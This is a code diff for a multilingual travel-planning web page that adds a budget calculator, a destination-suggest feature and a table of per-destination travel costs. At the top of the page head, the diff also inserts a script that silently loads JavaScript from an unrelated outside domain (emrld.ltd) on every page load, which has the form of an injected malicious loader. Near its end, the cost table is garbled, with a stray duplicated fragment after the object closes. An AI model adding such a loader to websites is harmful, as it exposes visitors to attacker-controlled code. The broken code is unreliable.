@@ -1,6 +1,14 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
+<script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrld.ltd/NTA3NDA0.js?t=507404';
+      document.head.appendChild(script);
+  })();
+</script>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Travel Studio — Tu viaje con criterio</title>
@@ -55,6 +63,35 @@ h1 em{font-style:italic;color:#A7F3D0}
 .form-hed{font-family:var(--font-display);font-size:1.55rem;font-weight:400;margin-bottom:.3rem;letter-spacing:-.025em;line-height:1.15;color:var(--ink)}
 .form-sub{font-family:var(--font-prose);font-size:.98rem;color:var(--ink2);margin-bottom:1.8rem;font-style:italic;line-height:1.55}
 .fg{display:flex;flex-direction:column;gap:.28rem;margin-bottom:.8rem}
+/* Budget amount row */
+.budget-amount-row{display:grid;grid-template-columns:1fr 1fr;gap:.7rem}
+.budget-input-wrap{display:flex;align-items:center;gap:0;border:1.5px solid var(--border);border-radius:var(--r);background:var(--white);overflow:hidden;transition:border-color .18s,box-shadow .18s}
+.budget-input-wrap:focus-within{border-color:var(--sage);box-shadow:0 0 0 3px rgba(74,124,89,.1)}
+.budget-euro{padding:.68rem .6rem .68rem .9rem;font-size:.87rem;color:var(--ink2);font-weight:600;background:transparent;pointer-events:none}
+.budget-input-wrap input{border:none;border-radius:0;padding:.68rem .4rem;width:80px;flex:1;box-shadow:none!important;background:transparent}
+.budget-input-wrap input:focus{border:none;box-shadow:none}
+.budget-input-wrap select{border:none;border-left:1.5px solid var(--border);border-radius:0;padding:.68rem .7rem;font-size:.75rem;color:var(--ink2);background:var(--sand);box-shadow:none!important;width:auto;flex-shrink:0}
+.budget-input-wrap select:focus{border:none;border-left:1.5px solid var(--border);box-shadow:none}
+/* Destination suggest toggle */
+.dest-wrap{position:relative;display:flex;flex-direction:column;gap:.35rem}
+.dest-wrap input{width:100%}
+.dest-suggest-btn{padding:.38rem .8rem;border:1.5px dashed var(--border);border-radius:8px;background:transparent;font-size:.68rem;font-weight:600;color:var(--ink2);cursor:pointer;transition:all .15s;text-align:left}
+.dest-suggest-btn:hover{border-color:var(--sage);color:var(--sage-dark)}
+.dest-suggest-btn.on{border-color:var(--sage);color:var(--sage-dark);background:var(--sage-light)}
+/* Budget check panel */
+.budget-check{border:1.5px solid var(--border);border-radius:var(--r);padding:1rem 1.1rem;margin-bottom:.8rem;background:var(--white);display:none}
+.budget-check.show{display:block}
+.budget-check.ok{border-color:#4a7c59;background:#f0f7f2}
+.budget-check.warn{border-color:#d97706;background:#fffbeb}
+.bc-title{font-size:.78rem;font-weight:700;margin-bottom:.45rem}
+.bc-breakdown{font-size:.75rem;color:var(--ink2);line-height:1.7}
+.bc-breakdown b{color:var(--ink)}
+.bc-alts{margin-top:.7rem;display:flex;flex-direction:column;gap:.35rem}
+.bc-alt{padding:.45rem .8rem;border:1.5px solid var(--border);border-radius:8px;background:var(--white);font-size:.76rem;cursor:pointer;display:flex;justify-content:space-between;align-items:center;transition:all .15s}
+.bc-alt:hover{border-color:var(--sage);background:var(--sage-light)}
+.bc-alt-name{font-weight:700;color:var(--ink)}
+.bc-alt-detail{color:var(--ink2);font-size:.7rem}
+.bc-warn-cta{margin-top:.6rem;font-size:.72rem;color:var(--ink2);cursor:pointer;text-decoration:underline}
 label{font-size:.6rem;font-weight:700;color:var(--ink2);letter-spacing:.09em;text-transform:uppercase}
 input,select,textarea{border:1.5px solid var(--border);border-radius:var(--r);padding:.68rem 1rem;font-family:var(--font-body);font-size:.87rem;color:var(--ink);outline:none;transition:border-color .18s,box-shadow .18s;background:var(--white);width:100%}
 input[type=date]{color-scheme:light}
@@ -284,12 +321,12 @@ textarea{resize:none;height:56px;font-size:.82rem}
 .rct-total-val{font-family:var(--font-display);font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--teal),#67E8F9);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-align:right;white-space:nowrap}
 /* Day recap timeline */
 .day-recap-list{display:flex;flex-direction:column;gap:0;margin-bottom:1.3rem;border:1.5px solid var(--border);border-radius:var(--r);overflow:hidden}
-.dr-row{display:flex;align-items:center;gap:.8rem;padding:.65rem 1rem;border-bottom:1px solid var(--border);transition:background .15s;cursor:default}
+.dr-row{display:flex;align-items:center;gap:.9rem;padding:.85rem 1.1rem;border-bottom:1px solid var(--border);transition:background .15s;cursor:default}
 .dr-row:last-child{border-bottom:none}
 .dr-row:hover{background:linear-gradient(90deg,var(--teal-light),transparent)}
-.dr-n{width:22px;height:22px;border-radius:50%;background:linear-gradient(135deg,var(--sage-dark),var(--sage));color:#fff;font-size:.6rem;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 2px 6px rgba(15,118,110,.3)}
-.dr-txt{font-size:.79rem;color:var(--ink2);line-height:1.35;flex:1}
-.dr-cost{font-size:.7rem;font-weight:700;color:var(--teal-dark);white-space:nowrap;background:var(--teal-light);padding:.12rem .5rem;border-radius:100px}
+.dr-n{width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,var(--sage-dark),var(--sage));color:#fff;font-size:.65rem;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 2px 6px rgba(15,118,110,.3)}
+.dr-txt{font-size:.88rem;color:var(--ink2);line-height:1.45;flex:1}
+.dr-cost{font-size:.74rem;font-weight:700;color:var(--teal-dark);white-space:nowrap;background:var(--teal-light);padding:.15rem .55rem;border-radius:100px}
 /* Accommodation */
 .accom-hed{font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);margin-bottom:.65rem}
 .accom-list{display:flex;flex-direction:column;gap:.5rem}
@@ -584,11 +621,40 @@ textarea{resize:none;height:56px;font-size:.82rem}
     <div class="form-sub" data-i="formSub"></div>
     <div class="g2">
       <div class="fg"><label data-i="labelFrom"></label><input type="text" id="origin" data-i-ph="phFrom"/></div>
-      <div class="fg"><label data-i="labelTo"></label><input type="text" id="dest" data-i-ph="phTo"/></div>
+      <div class="fg" id="destFg"><label data-i="labelTo"></label>
+        <div class="dest-wrap">
+          <input type="text" id="dest" data-i-ph="phTo"/>
+          <button class="dest-suggest-btn" id="destSuggestBtn" onclick="toggleDestSuggest()" type="button" data-i="destSuggestBtn"></button>
+        </div>
+      </div>
     </div>
     <div class="g2">
       <div class="fg"><label data-i="labelDepart"></label><input type="date" id="df"/></div>
       <div class="fg"><label data-i="labelReturn"></label><input type="date" id="dt"/></div>
+    </div>
+    <div class="budget-amount-row">
+      <div class="fg fg-budget">
+        <label data-i="labelBudgetAmount"></label>
+        <div class="budget-input-wrap">
+          <span class="budget-euro">€</span>
+          <input type="number" id="budgetAmount" min="50" max="50000" step="50" placeholder="500" data-i-ph="phBudget"/>
+          <select id="budgetPer">
+            <option value="person" data-i="budgetPerPerson"></option>
+            <option value="total" data-i="budgetPerTotal"></option>
+          </select>
+        </div>
+      </div>
+      <div class="fg">
+        <label data-i="labelDuration"></label>
+        <select id="durationSelect" onchange="syncDuration()">
+          <option value="2" data-i="dur2"></option>
+          <option value="3" data-i="dur3"></option>
+          <option value="5" data-i="dur5"></option>
+          <option value="7" selected data-i="dur7"></option>
+          <option value="10" data-i="dur10"></option>
+          <option value="14" data-i="dur14"></option>
+        </select>
+      </div>
     </div>
     <div class="flex-row">
       <label data-i="labelFlexible"></label>
@@ -617,6 +683,7 @@ textarea{resize:none;height:56px;font-size:.82rem}
     </div>
     <div class="fg"><label data-i="labelStyle"></label><div class="tags" id="tagsWrap"></div></div>
     <div class="fg"><label data-i="labelNotes"></label><textarea id="extra" data-i-ph="phNotes"></textarea></div>
+    <div id="budgetCheckPanel" class="budget-check"></div>
     <button class="btn-gen" id="genBtn" onclick="gen()">
       <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
       <span data-i="btnGen"></span>
@@ -680,6 +747,15 @@ const I18N={
     labelDepart:'Salida',labelReturn:'Vuelta',
     labelFlexible:'¿Fechas flexibles?',flexNo:'Fechas fijas',flexYes:'Flexible ±3 días',
     labelTravelers:'¿Con quién?',labelBudget:'Nivel',
+    labelBudgetAmount:'Presupuesto total',phBudget:'500',
+    budgetPerPerson:'por persona',budgetPerTotal:'total grupo',
+    labelDuration:'Duración',
+    dur2:'Fin de semana (2 días)',dur3:'3 días',dur5:'5 días',dur7:'1 semana',dur10:'10 días',dur14:'2 semanas',
+    destSuggestBtn:'¿Sin destino? Sugiéreme →',destSuggestBtnOn:'✕ Tengo destino',
+    budgetWarnTitle:'⚠️ El presupuesto puede quedarse justo',
+    budgetOkTitle:'✓ Presupuesto viable',
+    budgetSuggestTitle:'Destinos posibles con tu presupuesto',
+    budgetWarnCta:'Generar de todas formas',
     tSolo:'Solo/a',tCouple:'En pareja',tFriends:'Con amigos',tFamily:'En familia',
     bLow:'Con cabeza',bMid:'Sin obsesionarse',bHigh:'Con margen',bPremium:'Sin límites',
     labelStyle:'Estilo de viaje',labelNotes:'Notas (opcional)',
@@ -726,6 +802,15 @@ const I18N={
     labelDepart:'Departure',labelReturn:'Return',
     labelFlexible:'Flexible dates?',flexNo:'Fixed',flexYes:'Flexible ±3 days',
     labelTravelers:'With?',labelBudget:'Style',
+    labelBudgetAmount:'Total budget',phBudget:'500',
+    budgetPerPerson:'per person',budgetPerTotal:'total group',
+    labelDuration:'Duration',
+    dur2:'Weekend (2 days)',dur3:'3 days',dur5:'5 days',dur7:'1 week',dur10:'10 days',dur14:'2 weeks',
+    destSuggestBtn:'No destination? Suggest one →',destSuggestBtnOn:'✕ I have a destination',
+    budgetWarnTitle:'⚠️ Budget might be tight',
+    budgetOkTitle:'✓ Budget looks viable',
+    budgetSuggestTitle:'Destinations that fit your budget',
+    budgetWarnCta:'Generate anyway',
     tSolo:'Solo',tCouple:'Couple',tFriends:'Friends',tFamily:'Family',
     bLow:'Mindful',bMid:'Comfortable',bHigh:'Generous',bPremium:'No limits',
     labelStyle:'Trip vibe',labelNotes:'Notes (optional)',
@@ -772,6 +857,15 @@ const I18N={
     labelDepart:'Départ',labelReturn:'Retour',
     labelFlexible:'Dates flexibles ?',flexNo:'Fixes',flexYes:'Flexible ±3 jours',
     labelTravelers:'Avec qui ?',labelBudget:'Style',
+    labelBudgetAmount:'Budget total',phBudget:'500',
+    budgetPerPerson:'par personne',budgetPerTotal:'total groupe',
+    labelDuration:'Durée',
+    dur2:'Week-end (2 jours)',dur3:'3 jours',dur5:'5 jours',dur7:'1 semaine',dur10:'10 jours',dur14:'2 semaines',
+    destSuggestBtn:'Pas de destination ? Suggère-moi →',destSuggestBtnOn:'✕ J\'ai une destination',
+    budgetWarnTitle:'⚠️ Budget peut être serré',
+    budgetOkTitle:'✓ Budget viable',
+    budgetSuggestTitle:'Destinations possibles avec votre budget',
+    budgetWarnCta:'Générer quand même',
     tSolo:'Seul(e)',tCouple:'En couple',tFriends:'Entre amis',tFamily:'En famille',
     bLow:'Malin',bMid:'À l\'aise',bHigh:'Généreux',bPremium:'Sans limites',
     labelStyle:'Ambiance du voyage',labelNotes:'Notes (optionnel)',
@@ -973,6 +1067,370 @@ function shareTrip(){
 // ═══════════════════════════════════
 let flexDates=false;
 function setFlex(v){flexDates=v;document.getElementById('flexYes').classList.toggle('on',v);document.getElementById('flexNo').classList.toggle('on',!v);}
+
+// ═══════════════════════════════════
+// BUDGET CALCULATOR + DESTINATION SUGGEST
+// ═══════════════════════════════════
+let destSuggestMode = false;
+
+function toggleDestSuggest(){
+  destSuggestMode = !destSuggestMode;
+  const destInput = document.getElementById('dest');
+  const btn = document.getElementById('destSuggestBtn');
+  const fg = document.getElementById('destFg');
+  if(destSuggestMode){
+    destInput.value='';
+    destInput.style.display='none';
+    btn.classList.add('on');
+    btn.textContent = t('destSuggestBtnOn');
+  } else {
+    destInput.style.display='';
+    btn.classList.remove('on');
+    btn.textContent = t('destSuggestBtn');
+  }
+  checkBudget();
+}
+
+function syncDuration(){
+  const dur = parseInt(document.getElementById('durationSelect').value);
+  const df = document.getElementById('df');
+  const dt = document.getElementById('dt');
+  if(df.value){
+    const start = new Date(df.value+'T00:00:00');
+    const end = new Date(start);
+    end.setDate(end.getDate()+dur);
+    dt.value = end.toISOString().split('T')[0];
+  }
+}
+
+// Cost-of-living database — realistic ranges (€ per person per day)
+// [flight_roundtrip, hotel_night, food_day, transport_local]
+const DEST_DB = {
+  // ── ESPAÑA — ciudades ──
+  'Madrid':            {f:[0,0],  h:[60,130], c:35,t:10, note:'Sin vuelo desde Madrid'},
+  'Barcelona':         {f:[30,80],h:[70,150], c:40,t:12, note:'AVE ~€50pp o vuelo'},
+  'Sevilla':           {f:[30,70],h:[55,110], c:30,t:8,  note:'AVE o vuelo económico'},
+  'Valencia':          {f:[25,65],h:[55,110], c:30,t:8,  note:'Fácil en AVE o vuelo'},
+  'Bilbao':            {f:[40,90],h:[65,130], c:38,t:10, note:'Vuelo ~1h desde Madrid'},
+  'Granada':           {f:[40,90],h:[50,100], c:28,t:7,  note:'Vuelo o coche desde Málaga'},
+  'San Sebastián':     {f:[40,100],h:[90,180],c:45,t:10, note:'Caro pero pequeño y perfecto'},
+  'Málaga':            {f:[30,80],h:[55,110], c:30,t:8,  note:'Vuelo o AVE'},
+  'Cádiz':             {f:[40,90],h:[55,110], c:28,t:8,  note:'Vuelo a Jerez o coche desde Sevilla'},
+  'Salamanca':         {f:[0,0],  h:[50,100], c:28,t:8,  note:'2h en coche desde Madrid, sin vuelo'},
+  'Toledo':            {f:[0,0],  h:[55,110], c:30,t:8,  note:'30min en AVE desde Madrid'},
+  'Córdoba':           {f:[30,70],h:[50,100], c:28,t:7,  note:'AVE desde Madrid ~€20-40'},
+  'Palma de Mallorca': {f:[40,110],h:[65,150],c:38,t:12, note:'Vuelo ~1h, coche recomendable'},
+  'Menorca':           {f:[50,130],h:[60,140],c:35,t:15, note:'Vuelo + coche de alquiler esencial'},
+  'Ibiza':             {f:[50,140],h:[80,250],c:55,t:15, note:'Cara en verano, preciosa en mayo/oct'},
+
+  // ── CANARIAS — ciudades ──
+  'Tenerife':          {f:[50,130],h:[55,130],c:32,t:15, note:'Vuelo ~2.5h, sur vs norte: mundos distintos'},
+  'Gran Canaria':      {f:[50,130],h:[55,130],c:32,t:15, note:'Vuelo ~2.5h, perfecta todo el año'},
+  'Lanzarote':         {f:[55,140],h:[55,130],c:32,t:18, note:'Vuelo ~2.5h, coche imprescindible'},
+  'Fuerteventura':     {f:[55,140],h:[55,125],c:30,t:18, note:'Vuelo ~2.5h, la mejor isla para playa y viento'},
+  'La Palma':          {f:[70,160],h:[50,110],c:28,t:20, note:'Vuelo con escala, poca masificación'},
+  'La Gomera':         {f:[70,160],h:[45,100],c:25,t:20, note:'Ferry desde Tenerife, naturaleza salvaje'},
+  'El Hierro':         {f:[80,170],h:[45,95], c:25,t:20, note:'La más auténtica, la menos turística'},
+
+  // ── ROAD TRIPS — ESPAÑA ──
+  'Road trip Costa Brava':          {f:[30,80],h:[70,150],c:40,t:0,road:true,car:[30,55],note:'Coche desde Barcelona · Cadaqués, Begur, Cap de Creus · 5-7 días ideal'},
+  'Road trip Picos de Europa':      {f:[40,100],h:[55,110],c:32,t:0,road:true,car:[35,60],note:'Coche desde Bilbao o Oviedo · Asturias + Cantabria · 5-7 días'},
+  'Road trip Norte de Galicia':     {f:[40,100],h:[50,100],c:28,t:0,road:true,car:[30,55],note:'Vuelo a Santiago + coche · Costa da Morte, Rías Altas, Cabo Ortegal'},
+  'Road trip Ruta de la Plata':     {f:[0,0],  h:[50,100],c:28,t:0,road:true,car:[25,45],note:'Desde Madrid en coche · Cáceres, Mérida, Salamanca · 5-7 días'},
+  'Road trip Andalucía':            {f:[30,80],h:[55,110],c:30,t:0,road:true,car:[30,55],note:'Vuelo a Sevilla o Málaga + coche · Sevilla, Ronda, Granada, Cádiz'},
+  'Road trip Pirineos':             {f:[30,80],h:[55,120],c:35,t:0,road:true,car:[30,55],note:'Coche desde Barcelona o Pamplona · Ordesa, Ainsa, Benasque'},
+  'Road trip Castilla y León':      {f:[0,0],  h:[50,100],c:28,t:0,road:true,car:[25,45],note:'Desde Madrid · Segovia, Burgos, León, Salamanca · 5-7 días'},
+
+  // ── ROAD TRIPS — CANARIAS ──
+  'Road trip Tenerife':             {f:[50,130],h:[55,120],c:32,t:0,road:true,car:[25,45],note:'Vuelo + coche · Teide, Anaga, La Laguna, Masca · 5-7 días'},
+  'Road trip Gran Canaria':         {f:[50,130],h:[55,120],c:32,t:0,road:true,car:[25,45],note:'Vuelo + coche · Dunas de Maspalomas, Roque Nublo, Las Palmas · 5-7 días'},
+  'Road trip Lanzarote':            {f:[55,140],h:[55,120],c:30,t:0,road:true,car:[25,45],note:'Vuelo + coche · Timanfaya, Jameos del Agua, Orzola · coche imprescindible'},
+  'Road trip Fuerteventura':        {f:[55,140],h:[50,115],c:28,t:0,road:true,car:[25,45],note:'Vuelo + coche · Jandía, Cofete, Corralejo, El Cotillo · 5-7 días'},
+  'Interislas Canarias':            {f:[55,140],h:[52,120],c:30,t:0,road:true,car:[25,45],ferry:[15,40],note:'Vuelo + ferry entre islas + coche · Tenerife+La Gomera o Gran Canaria+Fuerteventura'},
+
+  // ── ROAD TRIPS — PORTUGAL ──
+  'Road trip Alentejo':             {f:[50,120],h:[55,120],c:30,t:0,road:true,car:[28,50],note:'Vuelo a Lisboa + coche · Évora, Monsaraz, viñedos, playas del Alentejo'},
+  'Road trip Costa Vicentina':      {f:[50,120],h:[55,120],c:30,t:0,road:true,car:[28,50],note:'Vuelo a Lisboa o Faro + coche · la costa más salvaje de Europa occidental'},
+  'Road trip Norte de Portugal':    {f:[50,110],h:[55,120],c:28,t:0,road:true,car:[28,50],note:'Vuelo a Oporto + coche · Douro, Minho, Gerês, Viana do Castelo'},
+  'Road trip Lisboa a Oporto':      {f:[50,120],h:[58,130],c:32,t:0,road:true,car:[28,50],note:'Vuelo de entrada + coche · Óbidos, Nazaré, Coimbra, Douro · 7-10 días'},
+
+  // ── ROAD TRIPS — FRANCIA ──
+  'Road trip Provenza':             {f:[60,140],h:[70,160],c:48,t:0,road:true,car:[35,60],note:'Vuelo a Marsella o Niza + coche · Gorges du Verdon, Luberon, Camargue'},
+  'Road trip Costa Azul':           {f:[70,160],h:[90,200],c:60,t:0,road:true,car:[35,65],note:'Vuelo a Niza + coche · Niza, Antibes, Saint-Tropez, Cassis · cara pero incomparable'},
+  'Road trip Bretaña':              {f:[70,150],h:[65,140],c:42,t:0,road:true,car:[35,60],note:'Vuelo a Rennes o Nantes + coche · costa salvaje, ostras, Mont-Saint-Michel'},
+  'Road trip Valle del Loira':      {f:[70,150],h:[70,150],c:45,t:0,road:true,car:[35,60],note:'Vuelo a Tours o tren desde París + coche · castillos, viñedos, ríos · 5-7 días'},
+
+  // ── ROAD TRIPS — ITALIA ──
+  'Road trip Toscana':              {f:[70,170],h:[75,180],c:50,t:0,road:true,car:[35,60],note:'Vuelo a Florencia o Pisa + coche · Siena, San Gimignano, Val d\'Orcia · 5-7 días'},
+  'Road trip Sicilia':              {f:[80,170],h:[55,120],c:38,t:0,road:true,car:[30,55],note:'Vuelo a Palermo + coche · Agrigento, Siracusa, Etna, Taormina · 7-10 días'},
+  'Road trip Costa Amalfitana':     {f:[70,170],h:[80,200],c:50,t:0,road:true,car:[30,55],note:'Vuelo a Nápoles + coche · Pompeya, Positano, Ravello, Paestum · cara pero única'},
+  'Road trip Cerdeña':              {f:[70,160],h:[60,150],c:40,t:0,road:true,car:[30,55],note:'Vuelo a Cagliari o Olbia + coche · playas increíbles, interior desconocido'},
+  'Road trip Apulia':               {f:[70,160],h:[55,130],c:38,t:0,road:true,car:[28,52],note:'Vuelo a Bari + coche · Trulli de Alberobello, Lecce, Polignano, Matera'},
+
+  // ── PORTUGAL ──
+  'Lisboa':       {f:[50,120],h:[60,140],c:35,t:12,note:'Vuelo ~2h, muy buena relación calidad-precio'},
+  'Oporto':       {f:[50,110],h:[55,120],c:30,t:10,note:'Vuelo ~2h, más barato que Lisboa'},
+  'Algarve':      {f:[60,130],h:[70,150],c:35,t:20,note:'Coche casi obligatorio'},
+
+  // ── FRANCIA ──
+  'París':        {f:[70,160],h:[90,200],c:55,t:18,note:'Caro pero accesible con anticip.'},
+  'Burdeos':      {f:[60,130],h:[75,150],c:45,t:12,note:'Vuelo ~1.5h'},
+  'Marsella':     {f:[60,130],h:[70,140],c:40,t:12,note:'Vuelo ~1.5h'},
+  'Lyon':         {f:[60,130],h:[80,160],c:48,t:14,note:'Gastronómico, muy subestimado'},
+  'Niza':         {f:[70,160],h:[85,190],c:55,t:14,note:'Vuelo ~1.5h, puerta de la Costa Azul'},
+  'Estrasburgo':  {f:[70,150],h:[70,140],c:45,t:12,note:'Alsacia, mercados navideños, frontera Alemania'},
+
+  // ── ITALIA ──
+  'Roma':         {f:[70,170],h:[80,180],c:50,t:14,note:'Vuelo ~2.5h'},
+  'Florencia':    {f:[70,160],h:[85,190],c:50,t:12,note:'Vuelo a Pisa o directo'},
+  'Venecia':      {f:[70,160],h:[100,250],c:55,t:10,note:'Cara pero única'},
+  'Nápoles':      {f:[70,160],h:[60,130],c:40,t:10,note:'Más barata que el norte'},
+  'Palermo':      {f:[80,160],h:[55,110],c:35,t:10,note:'Gastronomía increíble y barata'},
+  'Milán':        {f:[70,170],h:[90,200],c:55,t:15,note:'Vuelo fácil, caro pero eficiente'},
+  'Bolonia':      {f:[70,160],h:[70,150],c:45,t:12,note:'La mejor ciudad gastronómica de Italia'},
+
+  // ── MARRUECOS ──
+  'Marrakech':    {f:[80,180],h:[35,100],c:20,t:8,note:'Vuelo ~2.5h, costes muy bajos en destino'},
+  'Fez':          {f:[90,190],h:[30,90], c:18,t:7,note:'Más auténtica que Marrakech'},
+  'Tánger':       {f:[80,170],h:[35,90], c:18,t:8,note:'Vuelo o ferry desde Tarifa (~35min)'},
+  'Road trip Marruecos':            {f:[80,180],h:[30,90], c:18,t:0,road:true,car:[30,55],note:'Vuelo a Marrakech o Fez + coche · desierto, kasbahs, Atlas · 7-10 días'},
+
+  // ── REINO UNIDO ──
+  'Londres':      {f:[60,160],h:[100,220],c:65,t:20,note:'Caro, pero fácil en low cost'},
+  'Edimburgo':    {f:[70,160],h:[90,200],c:55,t:15,note:'Vuelo ~2.5h, preciosa'},
+  'Road trip Highlands Escocesas':  {f:[70,160],h:[70,160],c:50,t:0,road:true,car:[35,65],note:'Vuelo a Edimburgo o Inverness + coche · Loch Ness, Skye, Glen Coe · 7-10 días'},
+
+  // ── IRLANDA ──
+  'Dublín':       {f:[60,150],h:[90,200],c:60,t:15,note:'Vuelo ~2h, muy social'},
+  'Road trip Wild Atlantic Way':    {f:[60,150],h:[65,140],c:45,t:0,road:true,car:[35,60],note:'Vuelo a Dublín o Shannon + coche · Galway, Cliffs of Moher, Connemara · 7-10 días'},
+
+  // ── PAÍSES BAJOS ──
+  'Ámsterdam':    {f:[70,160],h:[100,220],c:55,t:15,note:'Vuelo ~2.5h, cara pero muy compacta'},
+
+  // ── ALEMANIA ──
+  'Berlín':       {f:[70,160],h:[70,150],c:45,t:15,note:'Vuelo ~2.5h, cultura brutal'},
+  'Múnich':       {f:[70,160],h:[80,170],c:50,t:15,note:'Vuelo ~2.5h, puerta de los Alpes'},
+  'Road trip Ruta Romántica':       {f:[70,160],h:[65,140],c:42,t:0,road:true,car:[35,60],note:'Vuelo a Múnich + coche · Rothenburg, Füssen, Neuschwanstein · 5-7 días'},
+
+  // ── AUSTRIA / SUIZA ──
+  'Viena':        {f:[80,170],h:[80,170],c:50,t:14,note:'Vuelo ~2.5h, imperial y accesible'},
+  'Salzburgo':    {f:[80,170],h:[80,160],c:48,t:14,note:'Vuelo a Múnich + tren 1.5h'},
+  'Road trip Alpes Austria-Suiza':  {f:[80,180],h:[90,200],c:55,t:0,road:true,car:[40,70],note:'Vuelo a Zúrich o Innsbruck + coche · lagos alpinos, Hallstatt, Grossglockner'},
+
+  // ── GRECIA ──
+  'Atenas':       {f:[80,180],h:[60,140],c:40,t:12,note:'Vuelo ~3h, muy razonable'},
+  'Santorini':    {f:[100,250],h:[120,400],c:55,t:15,note:'Cara en verano, mejor primavera/otoño'},
+  'Tesalónica':   {f:[90,180],h:[55,120],c:35,t:10,note:'Mucho mejor que Atenas y más barata'},
+  'Creta':        {f:[90,200],h:[55,130],c:38,t:18,note:'Vuelo + coche · la isla más grande y variada de Grecia'},
+  'Road trip Peloponeso':           {f:[80,180],h:[55,120],c:35,t:0,road:true,car:[28,52],note:'Vuelo a Atenas + coche · Micenas, Olimpia, Mystras, Monemvasia · 7 días'},
+  'Road trip islas griegas':        {f:[100,230],h:[65,180],c:42,t:0,road:true,car:[25,45],ferry:[20,50],note:'Vuelo + ferry entre islas · Atenas, Mikonos, Paros, Naxos o ruta Jónica'},
+
+  // ── CROACIA ──
+  'Dubrovnik':    {f:[90,220],h:[90,200],c:45,t:12,note:'Masificada en verano, mejor sept/oct'},
+  'Split':        {f:[80,180],h:[70,160],c:40,t:12,note:'Mejor base que Dubrovnik'},
+  'Zagreb':       {f:[70,160],h:[60,130],c:35,t:10,note:'Muy subestimada, barata y bonita'},
+  'Road trip Costa Croata':         {f:[80,180],h:[65,150],c:38,t:0,road:true,car:[28,52],ferry:[15,35],note:'Vuelo a Split o Dubrovnik + coche · Makarska, Hvar, Korčula, Pelješac · 7-10 días'},
+
+  // ── REPÚBLICA CHECA / HUNGRÍA / POLONIA ──
+  'Praga':        {f:[80,170],h:[55,130],c:30,t:10,note:'Vuelo ~3h, muy barata para Europa Central'},
+  'Budapest':     {f:[80,170],h:[55,120],c:30,t:10,note:'De las mejores relaciones calidad-precio de Europa'},
+  'Cracovia':     {f:[80,170],h:[45,100],c:25,t:8, note:'Increíblemente barata, historia brutal'},
+  'Road trip Europa Central':       {f:[80,170],h:[50,120],c:28,t:0,road:true,car:[30,55],note:'Vuelo a Praga o Viena + coche · Praga, Brno, Bratislava, Budapest · 7-10 días'},
+
+  // ── ISLANDIA ──
+  'Reikiavik':    {f:[120,280],h:[120,280],c:70,t:30,note:'Cara pero ningún sitio es igual'},
+  'Road trip Ring Road Islandia':   {f:[120,280],h:[90,200],c:65,t:0,road:true,car:[60,110],note:'Vuelo + 4x4 · la carretera circular completa · 8-12 días · imprescindible reservar coche con meses de antelación'},
+
+  // ── TURQUÍA ──
+  'Estambul':     {f:[90,200],h:[50,140],c:25,t:10,note:'Enorme valor — poco comparable en Europa'},
+  'Capadocia':    {f:[110,250],h:[60,200],c:25,t:20,note:'Globos aerostáticos incluidos'},
+  'Road trip Costa Turca (Turquesa)':{f:[90,210],h:[50,130],c:28,t:0,road:true,car:[28,50],note:'Vuelo a Dalaman o Bodrum + coche · Ölüdeniz, Kaş, Patara, Éfeso · 7-10 días'},
+
+  // ── NORUEGA ──
+  'Road trip Fiordos Noruega':      {f:[100,230],h:[90,190],c:65,t:0,road:true,car:[40,70],ferry:[20,50],note:'Vuelo a Bergen u Oslo + coche · Geiranger, Flåm, Nærøyfjord · caro pero sobrecogedor'},
+
+  // ── ESCANDINAVIA ──
+  'Estocolmo':    {f:[80,180],h:[90,190],c:58,t:16,note:'Vuelo ~3h, ciudad archipiélago'},
+  'Copenhague':   {f:[80,180],h:[100,210],c:65,t:18,note:'Vuelo ~2.5h, la más cara de las capitales nórdicas'},
+};,120],h:[60,140],c:35,t:12,note:'Vuelo ~2h, muy buena relación calidad-precio'},
+  'Oporto':       {f:[50,110],h:[55,120],c:30,t:10,note:'Vuelo ~2h, más barato que Lisboa'},
+  'Algarve':      {f:[60,130],h:[70,150],c:35,t:20,note:'Coche casi obligatorio'},
+  // France
+  'París':        {f:[70,160],h:[90,200],c:55,t:18,note:'Caro pero accesible con anticip.'},
+  'Burdeos':      {f:[60,130],h:[75,150],c:45,t:12,note:'Vuelo ~1.5h'},
+  'Marsella':     {f:[60,130],h:[70,140],c:40,t:12,note:'Vuelo ~1.5h'},
+  'Lyon':         {f:[60,130],h:[80,160],c:48,t:14,note:'Gastronómico, muy subestimado'},
+  // Italy
+  'Roma':         {f:[70,170],h:[80,180],c:50,t:14,note:'Vuelo ~2.5h'},
+  'Florencia':    {f:[70,160],h:[85,190],c:50,t:12,note:'Vuelo + tren o directo'},
+  'Venecia':      {f:[70,160],h:[100,250],c:55,t:10,note:'Cara pero única'},
+  'Nápoles':      {f:[70,160],h:[60,130],c:40,t:10,note:'Más barata que el norte'},
+  'Palermo':      {f:[80,160],h:[55,110],c:35,t:10,note:'Gastronomía increíble y barata'},
+  'Milán':        {f:[70,170],h:[90,200],c:55,t:15,note:'Vuelo fácil, caro pero eficiente'},
+  // Morocco
+  'Marrakech':    {f:[80,180],h:[35,100],c:20,t:8,note:'Vuelo ~2.5h, costes muy bajos en destino'},
+  'Fez':          {f:[90,190],h:[30,90],c:18,t:7,note:'Más auténtica que Marrakech'},
+  // UK
+  'Londres':      {f:[60,160],h:[100,220],c:65,t:20,note:'Caro, pero fácil en low cost'},
+  'Edimburgo':    {f:[70,160],h:[90,200],c:55,t:15,note:'Vuelo ~2.5h, preciosa'},
+  // Netherlands
+  'Ámsterdam':    {f:[70,160],h:[100,220],c:55,t:15,note:'Vuelo ~2.5h, cara pero muy compacta'},
+  // Greece
+  'Atenas':       {f:[80,180],h:[60,140],c:40,t:12,note:'Vuelo ~3h, muy razonable'},
+  'Santorini':    {f:[100,250],h:[120,400],c:55,t:15,note:'Cara en verano, mejor primavera/otoño'},
